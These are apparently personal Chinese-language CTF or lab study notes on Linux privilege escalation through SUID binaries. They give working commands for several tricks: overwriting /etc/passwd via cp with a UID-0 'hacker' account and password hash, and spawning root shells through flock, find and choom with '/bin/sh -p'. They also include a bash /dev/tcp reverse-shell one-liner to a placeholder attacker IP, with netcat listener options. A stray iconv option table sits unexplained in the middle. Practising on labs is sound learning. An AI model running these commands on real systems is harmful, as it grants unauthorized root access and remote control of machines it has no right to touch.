文件执行时临时获得文件所有者的权限，而非执行者的权限

发现命令/usr/bin/cp 具有管理员权限进行利用

用/usr/bin/cp 避免歧意到其他cp命令中，可以看到只有这个命令具有管理员权限。

覆盖/etc/passwd

解释为什么不直接用cp /etc/passwd 到一个新的临时文件 进行操作,覆盖操作，原因是cp是把整个文件复制包括它的所有者和需要的权限了
向cp操作的新文件进行写入一行新的root用户的时候，拒绝写入。就是这个问题。

echo 'hacker:$1$abc$BXBqpb9BZcZhXLgbee.0s/:0:0:root:/root:/bin/bash' >> /tmp/hacked_passwd

字段 值 含义
1. 用户名 hacker 账户名称
2. 密码（加密后） $1$abc$BXBqpb9BZcZhXLgbee.0s/ 这是 shadow 风格的密码哈希（本应只出现在 /etc/shadow 中）
3. UID 0 用户 ID = 0 → root 权限！
4. GID 0 组 ID = 0（通常是 root 组）
5. GECOS（描述信息） root 用户全名或备注（这里写成 “root”）
6. 家目录 /root 登录后的默认工作目录（root 用户的家目录）
7. Shell /bin/bash 登录后使用的 shell

通过/usr/bin/flock提权

老三样

whoami id sudo -l

find / -type f -perm -04000 -ls 2>/dev/null

60826091 36 -rwsr-xr-x 1 root root 35128 Apr 9 2024 /usr/bin/flock

交互shell

/usr/bin/flock /tmp/lockfile /bin/sh -p

直接把 /bin/sh 作为要执行的命令传给 flock

flock 的语法支持两种形式：

flock [options] [args…]

flock -c ‘command’

所以你的命令等价于：
“用 root 权限（因 SUID）运行 flock，然后让 flock 启动 /bin/sh -p”
关键点：-p 参数！
在大多数 Linux 系统中，/bin/sh -p 会 保留特权模式（privileged mode）

find命令

老三样

find / -type f -perm -04000 -ls 2>/dev/null

60825991 316 -rwsr-xr-x 1 root root 320160 Feb 18 2020 /usr/bin/find

直接传递找到flag

find / -name 'flag.txt' -exec cat {} \; 2>/dev/null

find / -type f -name 'flag*' -exec cat {} + 2>/dev/null

这两个命令都行。注意理解

或则直接交互shell

/usr/bin/find -exec /bin/bash -p {} \;

成功之后

选项 说明
-f, --from-code=ENC 指定输入编码（如 GBK、UTF-8）
-t, --to-code=ENC 指定输出编码
-o, --output=FILE 指定输出文件（默认输出到 stdout）
-c 忽略无法转换的字符（静默丢弃）
-l, --list 列出所有支持的编码
--verbose 显示详细信息

choom 提权

它是 systemd 项目里的一个小工具，作用是修改某个进程的“oom_score_adj”值。这个值决定了当系统内存不够时，Linux 内核会优先杀掉哪个进程

提权

choom -n 0 -- /bin/sh -p
-n 是指定数值的参数，0 是我们给出的值。 –:分界线，表示选项到此为止，后面的是要执行的命令 -p

mawk

mawk 是一个文本处理工具。它的设计功能就是打开文件、读取内容并进行处理。

反向shell命令

反向 Shell 优势：目标机器通常允许出站连接（HTTP/HTTPS/DNS），防火墙不拦截。
目标主动外连，绕过入站防火墙

bash -i >& /dev/tcp/攻击者IP/端口 0>&1

注意服务器先开启监听

nc -lvkp 8080 好用，但如果对方 IP 反查慢，会稍微卡一下

nc -lvvp 8080 更详细输出，但没 -k 可能不持续监听

nc -lvknp 8080 度快、持续监听、不卡 DNS、输出清晰
